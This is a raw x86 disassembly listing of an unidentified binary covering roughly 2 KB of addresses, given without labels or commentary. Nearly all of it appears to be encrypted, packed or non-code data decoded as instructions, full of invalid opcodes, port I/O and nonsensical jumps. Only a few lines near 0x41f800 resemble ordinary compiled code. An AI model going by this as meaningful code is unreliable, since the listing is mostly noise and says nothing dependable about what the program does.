  41f578:	add    DWORD PTR [esi-0x28393805],esi
  41f57e:	add    eax,edx
  41f580:	in     al,0xf5
  41f582:	push   es
  41f583:	jecxz  0x41f56e
  41f585:	adc    ecx,eax
  41f587:	loope  0x41f578
  41f589:	lock test eax,0xd4f1b7c1
  41f58f:	call   0xf00ee165
  41f594:	icebp  
  41f595:	clc    
  41f596:	neg    bl
  41f598:	add    al,al
  41f59a:	repz add bh,BYTE PTR [ebx-0x1a1f0c3a]
  41f5a1:	(bad)  
  41f5a2:	jmp    0xe048f7b1
  41f5a7:	loopne 0x41f56a
  41f5a9:	repnz mov al,0xc4
  41f5ac:	test   al,0xf2
  41f5af:	mov    ch,0xfb
  41f5b1:	jmp    0xbf00afad
  41f5b6:	retf   0xe3f8
  41f5b9:	in     al,dx
  41f5ba:	cli    
  41f5bb:	test   ah,0xe2
  41f5be:	aad    0xe2
  41f5c0:	stc    
  41f5c1:	fsubp  st(6),st
  41f5c3:	jmp    0xc1f3:0x13cb0bfc
  41f5ca:	out    0xd6,eax
  41f5cc:	loopne 0x41f593
  41f5ce:	out    dx,al
  41f5cf:	out    0xf0,al
  41f5d1:	fldl2t 
  41f5d3:	in     al,dx
  41f5d4:	mov    ah,0xeb
  41f5d6:	aam    0xf1
  41f5d8:	jmp    0x45ebae
  41f5dd:	or     ebx,ebx
  41f5df:	in     al,0xe0
  41f5e1:	pop    es
  41f5e2:	ftst   
  41f5e4:	cld    
  41f5e5:	loop   0x41f5f2
  41f5e7:	retf   0xa8ed
  41f5ea:	mov    edi,0xe0b7c6ee
  41f5ef:	jmp    0x41f5a6
  41f5f1:	mov    edx,0xe8eaf6ce
  41f5f6:	retf   
  41f5f7:	aam    0xf4
  41f5f9:	add    edi,eax
  41f5fb:	aad    0xe5
  41f5fd:	add    ebp,ebx
  41f5ff:	in     al,0xe8
  41f601:	fmulp  st(3),st
  41f603:	retf   0xedc7
  41f606:	cli    
  41f607:	loope  0x41f5d0
  41f609:	into   
  41f60a:	iret   
  41f60b:	loope  0x41f5b9
  41f60d:	mov    al,0xf2
  41f60f:	mov    ah,0xce
  41f611:	mov    edx,0xd5ccd5cf
  41f616:	mov    ah,0xdb
  41f618:	clc    
  41f619:	add    dh,ah
  41f61b:	ret    0xbe4
  41f61e:	mov    esp,0xfdc2e4e7
  41f623:	out    0xe3,eax
  41f625:	out    0xe2,eax
  41f627:	fnsave [edx-0x1728153c]
  41f62d:	ret    
  41f62e:	shl    bh,cl
  41f630:	mov    bl,0xae
  41f632:	mov    ah,0xb9
  41f634:	enter  0xceff,0xba
  41f638:	stc    
  41f639:	cli    
  41f63a:	aam    0xbe
  41f63c:	add    eax,0xfd070406
  41f641:	call   0xfa09c21a
  41f646:	add    esi,edx
  41f648:	(bad)  
  41f649:	call   0xb5edd730
  41f64e:	in     al,0xb6
  41f650:	(bad)  
  41f651:	out    0xca,eax
  41f653:	mov    ebx,0xd6b4d1d8
  41f658:	int3   
  41f659:	pop    es
  41f65a:	repnz lock rol ecx,cl
  41f65e:	aam    0xcb
  41f660:	mov    edx,0xc2eb0dd6
  41f666:	fmul   st,st(4)
  41f668:	call   0xc408c83c
  41f66d:	jmp    0x41f663
  41f66f:	test   bl,0xe7
  41f672:	(bad)  
  41f673:	mov    ebx,0xd5b8dafb
  41f678:	add    edx,edi
  41f67a:	mov    esp,0x1dce6bc
  41f67f:	jmp    0x41f65d
  41f681:	ret    0xef07
  41f684:	retf   0x4e9
  41f687:	int3   
  41f688:	ror    ebx,1
  41f68a:	jmp    0x41f66e
  41f68c:	lock cmc 
  41f68e:	jmp    0xf7db:0xffc4f5ca
  41f695:	mov    eax,0xe0c2b0ec
  41f69a:	repz cli 
  41f69c:	cli    
  41f69d:	ret    0x2dc
  41f6a0:	clc    
  41f6a1:	aad    0xf5
  41f6a3:	leave  
  41f6a4:	into   
  41f6a5:	add    eax,0xeebfed03
  41f6aa:	jmp    0xe8b5:0xeaf6c6e8
  41f6b1:	xlat   BYTE PTR ds:[ebx]
  41f6b2:	mov    bh,0xd6
  41f6b4:	idiv   BYTE PTR [esp+esi*4-0xe2b0008]
  41f6bb:	out    dx,al
  41f6bc:	add    edx,edx
  41f6be:	mov    esp,0xe8c2e0e4
  41f6c3:	push   es
  41f6c4:	jmp    0xbd23e9ac
  41f6c9:	out    0xa5,eax
  41f6cb:	(bad)  
  41f6cc:	in     al,dx
  41f6cd:	sti    
  41f6ce:	mov    bh,0xda
  41f6d0:	stc    
  41f6d1:	out    dx,eax
  41f6d2:	mov    dh,0xe8
  41f6d4:	retf   0xd2fd
  41f6d7:	mov    ecx,0xd1f5b9b9
  41f6dc:	add    DWORD PTR [edx-0x3052d3d],edi
  41f6e2:	cld    
  41f6e3:	fdivp  st(0),st
  41f6e5:	call   0xef02d1cc
  41f6ea:	loopne 0x41f6c3
  41f6ec:	call   0xf114abb8
  41f6f1:	mov    ebx,0xd8beeef6
  41f6f6:	int3   
  41f6f7:	sar    bh,cl
  41f6f9:	mov    dh,0xc1
  41f6fb:	out    0x3,al
  41f6fd:	add    eax,0xca0400d1
  41f702:	loope  0x41f70d
  41f704:	jmp    0xe3d8:0xa9ccf8c4
  41f70b:	jmp    0x41f6ea
  41f70d:	jecxz  0x41f6f5
  41f70f:	repnz fcom st(4)
  41f712:	rol    ah,cl
  41f714:	in     eax,dx
  41f715:	(bad)  
  41f716:	call   edi
  41f718:	mov    bh,0xe2
  41f71a:	out    0x1,al
  41f71c:	(bad)
  41f71f:	jmp    0x41f718
  41f721:	enter  0xd8c8,0xd5
  41f725:	into   
  41f726:	paddb  mm6,mm3
  41f729:	ret    
  41f72a:	in     eax,dx
  41f72b:	lods   eax,DWORD PTR ds:[esi]
  41f72c:	hlt    
  41f72d:	jecxz  0x41f6f0
  41f72f:	mov    ah,0xcd
  41f731:	(bad)  
  41f732:	rol    dh,cl
  41f734:	leave  
  41f735:	mov    ah,0xec
  41f737:	cld    
  41f738:	icebp  
  41f739:	mov    edx,0xf0d4e6bf
  41f73e:	cli    
  41f73f:	retf   
  41f740:	(bad)  
  41f741:	jmp    0x41f738
  41f743:	aad    0xd4
  41f745:	or     bl,cl
  41f747:	in     al,dx
  41f748:	out    0xb1,al
  41f74a:	ror    eax,cl
  41f74c:	cmc    
  41f74d:	enter  0xbbe0,0xf3
  41f751:	leave  
  41f752:	mov    ch,0xcd
  41f754:	in     al,0xc4
  41f756:	aam    0xb9
  41f758:	(bad)  
  41f75a:	add    bh,bh
  41f75c:	lock out 0xbc,eax
  41f75f:	add    ebx,ecx
  41f761:	cmc    
  41f762:	fadd   DWORD PTR [ecx]
  41f764:	or     dh,ah
  41f766:	push   cs
  41f767:	or     al,0xe8
  41f769:	scas   eax,DWORD PTR es:[edi]
  41f76a:	icebp  
  41f76b:	lods   al,BYTE PTR ds:[esi]
  41f76c:	loope  0x41f73a
  41f76e:	loop   0x41f718
  41f770:	shl    DWORD PTR [ecx+ebx*8-0x44b2111],cl
  41f777:	out    dx,eax
  41f778:	int    0xb8
  41f77a:	rcr    ebp,1
  41f77c:	fnstcw WORD PTR [ebp-0x2a0b080c]
  41f782:	add    eax,0xae7e8de
  41f787:	fldz   
  41f789:	out    0xdf,al
  41f78b:	fmul   st(3),st
  41f78d:	sti    
  41f78e:	mov    ebx,0xd7d0e9c5
  41f793:	in     eax,dx
  41f794:	enter  0xd8f4,0xe3
  41f798:	mov    ebp,0xe5feb8dc
  41f79d:	pop    es
  41f79e:	dec    DWORD PTR [edx]
  41f7a0:	pop    es
  41f7a1:	test   eax,0xcd0a0ee7
  41f7a7:	into   
  41f7a8:	mov    cl,0xf0
  41f7aa:	lods   al,BYTE PTR ds:[esi]
  41f7ab:	shl    eax,1
  41f7ad:	loop   0x41f79c
  41f7af:	ror    ecx,0xf6
  41f7b2:	sti    
  41f7b3:	mov    ecx,0xb4cbc8f5
  41f7b8:	fneni(8087 only) 
  41f7ba:	loop   0x41f77c
  41f7bc:	sar    cl,0xc5
  41f7bf:	cld    
  41f7c0:	or     eax,DWORD PTR ds:0xccaddbd
  41f7c6:	ficom  DWORD PTR [ecx]
  41f7c8:	fsubrp st(6),st
  41f7ca:	out    dx,al
  41f7cb:	repz xlat BYTE PTR ds:[ebx]
  41f7cd:	(bad)  
  41f7ce:	test   al,0xe4
  41f7d1:	retf   0xb8e7
  41f7d4:	cld    
  41f7d5:	clc    
  41f7d6:	fdivr  st(7),st
  41f7d8:	repz (bad) 
  41f7db:	ret    
  41f7dc:	mov    edi,0xe9dc03e6
  41f7e1:	loopne 0x41f7a4
  41f7e3:	mov    esp,0x27830ffa
  41f7e8:	and    al,0x0
  41f7ea:	add    BYTE PTR [ebx-0x1377b],cl
  41f7f0:	jmp    FWORD PTR ds:0x3272fb
  41f7f6:	xor    eax,0x75108b5
  41f7fb:	add    eax,0x7f55d8f2
  41f800:	mov    ecx,DWORD PTR [ebp-0x138]
  41f806:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  41f80d:	mov    eax,DWORD PTR [ebp-0x138]
  41f813:	cmp    DWORD PTR [ebp+eax*4-0x130],0x244ecb9d
  41f81e:	jbe    0x421bee
  41f824:	jmp    0x421bca
  41f829:	retf   0x3386
  41f82c:	sub    esi,DWORD PTR [edi+0x2e]
  41f82f:	shl    BYTE PTR [esi+0x7c],cl
  41f832:	inc    esi
  41f834:	jnp    0x41f7f9
  41f836:	fidivr DWORD PTR [ebp+edi*8+0x7b7a23d6]
  41f83d:	add    bl,BYTE PTR [eax-0x12f38485]
  41f843:	(bad)  
  41f844:	jmp    0x41f82c
  41f846:	test   al,0xc5
  41f848:	ret    0xbbd1
  41f84b:	mov    ah,0xd9
  41f84d:	mov    edx,0xd9dcb8c5
  41f852:	ror    edi,cl
  41f854:	add    dh,ch
  41f856:	mov    edi,0xf2ffe5f1
  41f85b:	retf   
  41f85c:	ret    0xfbf6
  41f85f:	push   es
  41f860:	or     BYTE PTR [ecx],al
  41f862:	in     eax,dx
  41f863:	add    bl,dh
  41f865:	out    dx,al
  41f866:	in     eax,dx
  41f867:	div    edx
  41f869:	mov    ah,0xd4
  41f86b:	sti    
  41f86c:	int    0xc9
  41f86e:	mov    ebx,0xded6cfdd
  41f873:	fstp   TBYTE PTR [ecx+0x6f3d7bc]
  41f879:	(bad)  
  41f87a:	sti    
  41f87b:	in     eax,0xf1
  41f87d:	in     al,0xdb
  41f87f:	fucom  st(3)
  41f881:	(bad)  
  41f882:	stc    
  41f883:	std    
  41f884:	retf   
  41f885:	loopne 0x41f844
  41f887:	lods   al,BYTE PTR ds:[esi]
  41f888:	scas   al,BYTE PTR es:[edi]
  41f889:	call   0xcd38de43
  41f88e:	mov    bh,0xde
  41f890:	in     al,0xf6
  41f892:	aad    0x1
  41f894:	cld    
  41f895:	clc    
  41f896:	out    dx,al
  41f897:	icebp  
  41f898:	fucomp st(4)
  41f89a:	rol    ecx,0x5
  41f89d:	add    ebx,ebp
  41f89f:	inc    ebx
  41f8a1:	jmp    0xd1f2feab
  41f8a6:	mov    al,0xf2
  41f8a8:	jecxz  0x41f879
  41f8aa:	int    0xd5
  41f8ac:	shr    dh,1
  41f8ae:	enter  0xf6dd,0xf1
  41f8b2:	cmc    
  41f8b3:	fld    DWORD PTR [eax]
  41f8b5:	fistp  QWORD PTR [eax-0x3202b01]
  41f8bb:	(bad)  
  41f8bc:	aam    0xc0
  41f8be:	pop    es
  41f8bf:	aam    0xc
  41f8c1:	aam    0x1
  41f8c3:	or     al,0xc0
  41f8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8c6:	iret   
  41f8c7:	mov    ebp,0xe9c8e7e3
  41f8cc:	mov    cl,0xe8
  41f8ce:	hlt    
  41f8cf:	std    
  41f8d0:	fucom  st(4)
  41f8d2:	shl    DWORD PTR [eax-0xb1c303e],1
  41f8d8:	aam    0xdc
  41f8da:	call   esi
  41f8dc:	dec    bl
  41f8de:	mov    DWORD PTR [edi],0x11e4edde
  41f8e4:	out    dx,eax
  41f8e5:	repnz int3 
  41f8e7:	(bad)  
  41f8e8:	fdiv   QWORD PTR [edi-0x1534250f]
  41f8ee:	fmul   st,st(1)
  41f8f0:	out    dx,al
  41f8f1:	ror    esi,1
  41f8f3:	hlt    
  41f8f4:	aam    0xfd
  41f8f6:	(bad)  
  41f8f8:	jecxz  0x41f8f3
  41f8fa:	add    eax,0x4c0f402
  41f8ff:	(bad)  
  41f900:	cli    
  41f901:	jmp    0xbdea:0xbdb2efcc
  41f908:	out    dx,eax
  41f909:	in     al,0xe6
  41f90b:	(bad)
  41f90e:	(bad)  
  41f910:	rol    BYTE PTR [ebx],1
  41f912:	fidivr WORD PTR [ebp+0x2fb00ba]
  41f918:	neg    esp
  41f91a:	fdivr  st,st(0)
  41f91c:	in     al,0xe0
  41f91e:	neg    ch
  41f920:	fimul  WORD PTR [ecx+eax*8]
  41f923:	or     ebx,eax
  41f925:	int3   
  41f926:	enter  0xbcae,0xe2
  41f92a:	call   0xeb06e6fe
  41f92f:	mov    ecx,0xd2f9e9ea
  41f934:	xlat   BYTE PTR ds:[ebx]
  41f935:	out    dx,eax
  41f936:	fld    DWORD PTR [ebx]
  41f938:	mov    edi,0xc4c4c1bd
  41f93d:	out    dx,eax
  41f93e:	clc    
  41f93f:	out    dx,eax
  41f940:	cli    
  41f941:	std    
  41f942:	call   0xefeada10
  41f947:	repnz scas al,BYTE PTR es:[edi]
  41f949:	lods   al,BYTE PTR ds:[esi]
  41f94a:	mov    dh,0xc6
  41f94c:	jmp    0xe93aa721
  41f951:	mov    edx,0xe7d0dfb8
  41f956:	in     eax,dx
  41f957:	in     al,dx
  41f958:	(bad)
  41f95b:	or     edi,esi
  41f95d:	fucomi st,st(3)
  41f95f:	push   es
  41f960:	enter  0xf3d9,0x8
  41f964:	shr    dh,0xc6
  41f967:	mov    cl,0xac
  41f969:	repz retf 0xc7c9
  41f96d:	(bad)  
  41f96f:	xlat   BYTE PTR ds:[ebx]
  41f970:	imul   ah
  41f972:	imul   bh
  41f974:	stc    
  41f975:	out    dx,al
  41f976:	mov    ch,0xe6
  41f978:	(bad)  
  41f979:	icebp  
  41f97a:	repz mov esp,0xd9c6deeb
  41f980:	int    0xde
  41f982:	sti    
  41f983:	std    
  41f984:	icebp  
  41f985:	loopne 0x41f978
  41f987:	loopne 0x41f93e
  41f989:	aam    0xb0
  41f98b:	rcl    bh,0xb5
  41f98e:	imul   bl
  41f990:	idiv   eax
  41f992:	std    
  41f993:	retf   0xeced
  41f996:	add    edi,esp
  41f998:	mov    DWORD PTR [ebx],0xc5e305eb
  41f99e:	fsubr  st(0),st
  41f9a0:	or     eax,DWORD PTR [ecx]
  41f9a2:	std    
  41f9a3:	push   cs
  41f9a4:	int3   
  41f9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9a6:	loop   0x41f97e
  41f9a8:	jecxz  0x41f95b
  41f9aa:	ret    0xe0e4
  41f9ad:	test   cl,0xf4
  41f9b0:	in     al,0xd3
  41f9b2:	mov    ecx,0xfce0c2de
  41f9b7:	call   ebx
  41f9b9:	icebp  
  41f9ba:	hlt    
  41f9bb:	mov    eax,0xe409d5e3
  41f9c0:	loope  0x41f99d
  41f9c2:	jmp    0xe931c2bf
  41f9c7:	iret   
  41f9c8:	leave  
  41f9c9:	mov    bl,0xcf
  41f9cb:	mov    bl,0xd2
  41f9cd:	sar    BYTE PTR [ecx-0xd022628],0xfb
  41f9d4:	loop   0x41f998
  41f9d6:	std    
  41f9d7:	pop    es
  41f9d8:	add    esp,esi
  41f9da:	(bad)
  41f9dd:	std    
  41f9de:	out    0xc8,al
  41f9e0:	add    edi,ebp
  41f9e2:	call   ebx
  41f9e4:	jecxz  0x41f9a6
  41f9e6:	retf   
  41f9e7:	lods   al,BYTE PTR ds:[esi]
  41f9e8:	imul   dh
  41f9ea:	(bad)  
  41f9eb:	fidivr DWORD PTR [ecx-0x160b2d21]
  41f9f1:	std    
  41f9f2:	int    0xbe
  41f9f4:	push   eax
  41f9f6:	rcl    dl,1
  41f9f8:	(bad)  
  41f9f9:	(bad)  
  41f9fb:	add    al,0x7
  41f9fd:	(bad)  
  41f9ff:	(bad)  
  41fa00:	(bad)  
  41fa01:	fcmovnu st,st(3)
  41fa03:	leave  
  41fa04:	(bad)  
  41fa05:	out    0xef,eax
  41fa07:	(bad)  
  41fa09:	lock loope 0x41f9f7
  41fa0c:	out    0xb2,eax
  41fa0e:	stc    
  41fa0f:	div    edi
  41fa11:	mov    esp,0x7dfdefd
  41fa16:	mov    eax,0xf0c0bdbd
  41fa1b:	fdivr  QWORD PTR [edi-0x7350623]
  41fa21:	add    ch,bh
  41fa23:	retf   
  41fa24:	out    dx,eax
  41fa25:	loopne 0x41fa06
  41fa27:	retf   
  41fa28:	shl    esp,1
  41fa2a:	int3   
  41fa2b:	repnz out dx,eax
  41fa2d:	icebp  
  41fa2e:	clc    
  41fa2f:	cli    
  41fa30:	(bad)  
  41fa31:	repz in eax,dx
  41fa33:	add    edx,ebx
  41fa35:	mov    dh,0xf4
  41fa37:	add    eax,ebp
  41fa39:	or     eax,ebp
  41fa3b:	fst    st(6)
  41fa3d:	cmc    
  41fa3e:	xlat   BYTE PTR ds:[ebx]
  41fa3f:	stc    
  41fa40:	fisttp DWORD PTR [ecx]
  41fa42:	or     al,BYTE PTR [esi]
  41fa44:	icebp  
  41fa45:	stos   BYTE PTR es:[edi],al
  41fa46:	retf   0xdcb0
  41fa49:	enter  0xecf4,0xb1
  41fa4d:	mov    cl,0xe9
  41fa4f:	jmp    0xdf3bc952
  41fa54:	into   
  41fa55:	lock rcl ah,1
  41fa58:	mov    BYTE PTR [edx],0xd5
  41fa5b:	push   es
  41fa5c:	lock retf 
  41fa5e:	leave  
  41fa5f:	syscall 
  41fa61:	(bad)  
  41fa62:	enter  0xcbfd,0xea
  41fa66:	lods   eax,DWORD PTR ds:[esi]
  41fa67:	int    0xae
  41fa69:	mov    ch,0xe9
  41fa6b:	ret    0xf6ea
  41fa6e:	in     al,dx
  41fa6f:	leave  
  41fa70:	mov    ebp,0xd0c2fedf
  41fa75:	fiadd  WORD PTR [esi]
  41fa77:	int    0xf7
  41fa79:	pop    es
  41fa7a:	jmp    0x41fa7a
  41fa7c:	shl    esp,0xdd
  41fa7f:	inc    ebp
  41fa81:	stc    
  41fa82:	fyl2x  
  41fa84:	(bad)  
  41fa85:	out    dx,al
  41fa86:	(bad)
  41fa89:	int    0xc4
  41fa8b:	mov    edx,0xf5d7f0f3
  41fa90:	fdivp  st(7),st
  41fa92:	mov    ebp,0xf507fbd2
  41fa97:	inc    BYTE PTR ds:0xe6c1dbfe
  41fa9d:	xlat   BYTE PTR ds:[ebx]
  41fa9e:	or     ebp,ebx
  41faa0:	std    
  41faa1:	in     al,dx
  41faa2:	add    bh,bh
  41faa4:	mov    ecx,0xceb6a8ec
  41faa9:	fadd   st(5),st
  41faab:	mov    bh,0xcb
  41faad:	call   0xcd26eb7d
  41fab2:	ret    
  41fab3:	cld    
  41fab4:	add    BYTE PTR [edx+0x6edded3],bh
  41faba:	(bad)  
  41fabb:	rol    esp,1
  41fabd:	(bad)  
  41fabe:	aad    0xff
  41fac0:	out    dx,al
  41fac1:	or     ebp,esp
  41fac3:	leave  
  41fac4:	retf   
  41fac5:	fsubr  st,st(2)
  41fac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fac8:	lods   eax,DWORD PTR ds:[esi]
  41fac9:	sti    
  41faca:	cli    
  41facb:	into   
  41facc:	mov    cl,0xb8
  41face:	jmp    0x41facf
  41fad0:	(bad)  
  41fad1:	test   bl,0xd8
  41fad4:	out    dx,al
  41fad5:	loope  0x41faba
  41fad7:	mov    BYTE PTR [edi],0xc5
  41fada:	hlt    
  41fadb:	rcr    dl,1
  41fadd:	les    ecx,FWORD PTR [eax]
  41fadf:	fmul   DWORD PTR [esi]
  41fae1:	add    al,0xde
  41fae3:	icebp  
  41fae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fae5:	into   
  41fae6:	out    dx,eax
  41fae7:	mul    bh
  41fae9:	scas   al,BYTE PTR es:[edi]
  41faea:	mov    al,0xb2
  41faec:	icebp  
  41faed:	rcl    edi,1
  41faef:	aam    0xeb
  41faf1:	call   0xe3fedeeb
  41faf6:	xlat   BYTE PTR ds:[ebx]
  41faf7:	jecxz  0x41fad8
  41faf9:	rol    BYTE PTR ds:0xf8e0c2da,cl
  41faff:	idiv   ah
  41fb01:	loop   0x41faee
  41fb03:	(bad)  
  41fb04:	mov    eax,0xe9d6aeeb
  41fb09:	hlt    
  41fb0a:	div    ecx
  41fb0c:	div    BYTE PTR [esi-0x7453219]
  41fb12:	mov    ecx,0xd7fe03da
  41fb17:	mov    edi,0xfed3f9bc
  41fb1c:	or     eax,DWORD PTR [ecx]
  41fb1e:	jmp    0xcc410026
  41fb23:	stc    
  41fb24:	mov    ebp,0xd1ddf2bc
  41fb29:	icebp  
  41fb2a:	sti    
  41fb2b:	mov    ebx,0xdbc4e7f8
  41fb30:	int    0xdf
  41fb32:	shr    dl,cl
  41fb34:	in     eax,dx
  41fb35:	std    
  41fb36:	push   es
  41fb37:	out    0xdc,eax
  41fb39:	aad    0xc6
  41fb3b:	cld    
  41fb3c:	lock ror BYTE PTR [edx],1
  41fb3f:	cld    
  41fb40:	or     edi,edx
  41fb42:	loop   0x41fb30
  41fb44:	mov    edi,0xc5c6c2b2
  41fb49:	hlt    
  41fb4a:	into   
  41fb4b:	stc    
  41fb4c:	mov    ch,0xf3
  41fb4e:	mov    dh,0xd0
  41fb50:	in     al,0xf2
  41fb52:	mov    ch,0xff
  41fb54:	stc    
  41fb55:	fadd   st(7),st
  41fb57:	lock cmc 
  41fb59:	add    edi,edx
  41fb5b:	stc    
  41fb5c:	add    al,0xe1
  41fb5e:	shl    edx,0x1
  41fb61:	into   
  41fb62:	or     ch,ah
  41fb64:	out    dx,eax
  41fb65:	in     al,dx
  41fb66:	mov    cl,0xef
  41fb68:	jmp    0x41fb45
  41fb6a:	jmp    0xc711ca65
  41fb6f:	cli    
  41fb70:	repnz hlt 
  41fb72:	fmul   st,st(6)
  41fb74:	(bad)  
  41fb75:	lock aad 0xe5
  41fb78:	div    cl
  41fb7a:	jecxz  0x41fb6e
  41fb7c:	cmc    
  41fb7d:	(bad)  
  41fb7e:	or     ah,ah
  41fb80:	fadd   QWORD PTR [eax]
  41fb82:	or     eax,0xc9a8aef9
  41fb87:	in     al,0xe6
  41fb89:	out    dx,eax
  41fb8a:	ret    
  41fb8b:	lods   al,BYTE PTR ds:[esi]
  41fb8c:	aad    0xc0
  41fb8e:	lods   eax,DWORD PTR ds:[esi]
  41fb8f:	(bad)
  41fb93:	into   
  41fb94:	hlt    
  41fb95:	sti    
  41fb96:	out    0xd3,eax
  41fb98:	idiv   eax
  41fb9a:	retf   
  41fb9b:	in     eax,0xfe
  41fb9d:	inc    BYTE PTR [ebx]
  41fb9f:	or     eax,0xd20400cf
  41fba4:	loop   0x41fb82
  41fba6:	(bad)  
  41fba7:	loopne 0x41fb8d
  41fba9:	loop   0x41fb6f
  41fbab:	(bad)  
  41fbac:	aam    0xc6
  41fbae:	aad    0xb0
  41fbb0:	fcmove st,st(2)
  41fbb2:	fucomp st(5)
  41fbb4:	shl    DWORD PTR [esi-0x1a1c1e2b],cl
  41fbba:	add    eax,edx
  41fbbc:	add    al,0x2
  41fbbe:	add    eax,0x409dd0d
  41fbc3:	add    al,0xe4
  41fbc5:	mov    esi,0xcdd0f5f7
  41fbca:	into   
  41fbcb:	lock shl al,1
  41fbce:	jmp    0xff:0xe3d1eadf
  41fbd5:	aam    0xdc
  41fbd7:	clc    
  41fbd8:	add    al,0xeb
  41fbda:	rcr    esi,1
  41fbdc:	add    bl,bh
  41fbde:	out    dx,eax
  41fbdf:	add    al,0xdb
  41fbe1:	jecxz  0x41fbf1
  41fbe3:	rol    ebx,cl
  41fbe5:	jmp    0xb3f5e99b
  41fbea:	mov    bl,0xc1
  41fbec:	ror    eax,1
  41fbee:	in     al,0xd9
  41fbf0:	aad    0xee
  41fbf2:	fdivr  st(1),st
  41fbf4:	mov    bh,0xfa
  41fbf6:	loop   0x41fbf0
  41fbf8:	repz pop es
  41fbfa:	retf   
  41fbfb:	(bad)  
  41fbfc:	in     al,0xea
  41fbfe:	fiadd  DWORD PTR [ecx]
  41fc00:	or     bl,cl
  41fc02:	add    eax,0xe7b2d8e6
  41fc07:	cmc    
  41fc08:	fdivr  st(0),st
  41fc0a:	leave  
  41fc0b:	in     eax,0xf0
  41fc0d:	xlat   BYTE PTR ds:[ebx]
  41fc0e:	call   0xe015ead9
  41fc13:	fdivr  DWORD PTR [edi+ebx*8-0x2b321122]
  41fc1a:	clc    
  41fc1b:	or     cl,BYTE PTR [edx]
  41fc1d:	in     eax,0xc7
  41fc1f:	cli    
  41fc20:	clc    
  41fc21:	jmp    0xb4140c12
  41fc26:	loope  0x41fc1e
  41fc28:	lock lods eax,DWORD PTR ds:[esi]
  41fc2a:	mov    dh,0xd4
  41fc2c:	fdivr  DWORD PTR [ebx-0x2b35274a]
  41fc32:	repz sar BYTE PTR [ebp+0x70302db],cl
  41fc39:	mov    esp,0x20aff07
  41fc3f:	stc    
  41fc40:	out    dx,al
  41fc41:	iret   
  41fc42:	fsubp  st(5),st
  41fc44:	jmp    0xf1c8:0xadd1f0e5
  41fc4b:	retf   0xc0e7
  41fc4e:	fdivrp st(3),st
  41fc50:	enter  0x2fc,0xca
  41fc54:	div    edx
  41fc56:	sti    
  41fc57:	fnstcw WORD PTR [ebx-0x17042210]
  41fc5d:	fsubrp st(6),st
  41fc5f:	retf   0xebe7
  41fc62:	sti    
  41fc63:	add    edi,ebp
  41fc65:	(bad)  
  41fc67:	in     al,dx
  41fc68:	loop   0x41fc57
  41fc6a:	ret    0xd9b3
  41fc6d:	in     eax,dx
  41fc6e:	div    ah
  41fc70:	(bad)  
  41fc72:	cld    
  41fc73:	cli    
  41fc74:	mov    edx,0xcdeee200
  41fc79:	rcr    ah,1
  41fc7b:	lock mov al,0xe9
  41fc7f:	or     cl,bh
  41fc81:	in     al,0xe4
  41fc83:	or     ecx,esp
  41fc85:	in     eax,dx
  41fc86:	(bad)  
  41fc87:	(bad)  
  41fc88:	(bad)  
  41fc89:	lock jmp 0x41fc87
  41fc8c:	iret   
  41fc8d:	cmc    
  41fc8e:	in     al,dx
  41fc8f:	enter  0xfbc9,0xb8
  41fc93:	xlat   BYTE PTR ds:[ebx]
  41fc94:	fcmovnu st,st(5)
  41fc96:	out    dx,al
  41fc97:	jecxz  0x41fc96
  41fc99:	fcomp  st(1)
  41fc9b:	lock ret 0xf9e2
  41fc9f:	sti    
  41fca0:	iret   
  41fca1:	or     eax,0xb2e10bd8
  41fca6:	loope  0x41fc66
  41fca8:	int    0xc0
  41fcaa:	jmp    0x41fc72
  41fcac:	mov    al,0xf6
  41fcae:	mov    ch,0xb8
  41fcb1:	lock (bad) 
  41fcb3:	clc    
  41fcb4:	(bad)  
  41fcb6:	aad    0xf5
  41fcb8:	std    
  41fcb9:	cmc    
  41fcba:	jmp    0x41fcc2
  41fcbc:	fsub   st,st(5)
  41fcbe:	call   0xeb4606c2
  41fcc3:	adc    bl,ch
  41fcc5:	in     al,0xcb
  41fcc7:	mov    bl,0xac
  41fcc9:	in     eax,0xfa
  41fccb:	jmp    0x41fcc1
  41fccd:	retf   
  41fcce:	idiv   ch
  41fcd0:	out    dx,al
  41fcd1:	cld    
  41fcd2:	mov    eax,0xc7f9e9b4
  41fcd7:	(bad)  
  41fcd8:	fdivr  DWORD PTR [ebp+0xb06ebcb]
  41fcde:	retf   0xcdc0
  41fce1:	(bad)  
  41fce3:	fsubr  QWORD PTR [ebx-0x194d4228]
  41fce9:	iret   
  41fcea:	int    0xea
  41fcec:	fcmovnu st,st(0)
  41fcee:	jmp    0xefcf:0xceebf0cf
  41fcf5:	jmp    edx
  41fcf7:	test   eax,0xebd7fdd8
  41fcfd:	push   es
  41fcfe:	aad    0xf9
  41fd00:	loop   0x41fce1
  41fd02:	stc    
  41fd03:	enter  0xc0c6,0xf1
  41fd07:	repnz imul DWORD PTR [ebx+esi*8-0x3a0b3e46]
  41fd0f:	(bad)  
  41fd11:	mov    dh,0xf8
  41fd13:	stc    
  41fd14:	hlt    
  41fd15:	xlat   BYTE PTR ds:[ebx]
  41fd16:	mov    esp,0xc6ddbdbe
  41fd1b:	fsubr  st(6),st
  41fd1d:	retf   
  41fd1e:	add    al,BYTE PTR [ebx]
  41fd20:	call   0xe30e0c21
  41fd25:	out    dx,al
  41fd26:	mov    esi,0xf2f1d5ee
  41fd2b:	mov    ah,0xc0
  41fd2d:	(bad)  
  41fd2e:	sti    
  41fd2f:	(bad)  
  41fd30:	repz mov eax,0xd2bdd7e8
  41fd36:	std    
  41fd37:	cmc    
  41fd38:	rol    cl,cl
  41fd3a:	mov    ecx,0x4f0e6db
  41fd3f:	retf   0xe80b
  41fd42:	(bad)  
  41fd43:	fdivr  DWORD PTR [esi-0x1a570c40]
  41fd49:	loop   0x41fd1a
  41fd4b:	cli    
  41fd4c:	xlat   BYTE PTR ds:[ebx]
  41fd4d:	int    0xbb
  41fd4f:	into   
  41fd50:	(bad)  
  41fd51:	jmp    0xf111fc27
  41fd56:	out    dx,eax
  41fd57:	mov    ah,0xf7
  41fd59:	lock fdiv st(3),st
  41fd5c:	fstp   st(6)
  41fd5e:	add    al,0xcb
  41fd60:	fisttp DWORD PTR ds:0xdece0dee
  41fd66:	(bad)  
  41fd67:	retf   0xf5c8
  41fd6a:	into   
  41fd6b:	aam    0xef
  41fd6d:	cli    
  41fd6e:	lock mov eax,0xefbfbbd1
